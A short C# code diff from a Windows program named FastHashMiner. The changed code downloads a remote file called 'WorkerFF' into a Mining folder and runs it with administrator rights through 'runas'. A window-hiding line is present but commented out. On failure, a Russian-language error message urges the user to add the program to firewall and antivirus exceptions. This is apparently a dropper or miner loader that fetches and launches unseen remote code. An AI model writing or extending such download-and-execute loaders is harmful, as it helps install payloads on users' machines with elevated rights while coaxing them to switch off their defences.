@@ -18,7 +18,7 @@ namespace FastHashMiner
         public static Form1 currentForm;
         public ProgressLoading progressLoading;
         public Thread threadPLoad;
-        string fileName = "WorkerFF";
+        public string fileName = "WorkerFF";
         public string floader = "\\Mining\\";
         public string file = "CryptoMiner.exe";
         public Form1()
@@ -67,14 +67,14 @@ namespace FastHashMiner
 
                 if (Checking.CheckInterner())
                 {
-                    Loading.DownloadF(fileName, parth + floader + file);
+                    Loading.DownloadF(fileName, parth + floader);
                 }
 
                 new Process
                 {
                     StartInfo =
                     {
-                        FileName = fileName,
+                        FileName = parth + floader + fileName,
                         //WindowStyle = ProcessWindowStyle.Hidden,
                         Verb = "runas"
                     }
@@ -82,7 +82,9 @@ namespace FastHashMiner
             }
             catch (Exception ex)
             {
+                Form1.currentForm.threadPLoad.Abort();
                 MessageBox.Show("Возникла ошибка при загрузке, сервера недоступны,\n добавьте программу в исключения брандмауэра, антивируса или попробуйте повторить попытку позже", "Error", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                Environment.Exit(0);
             }
         }
     }
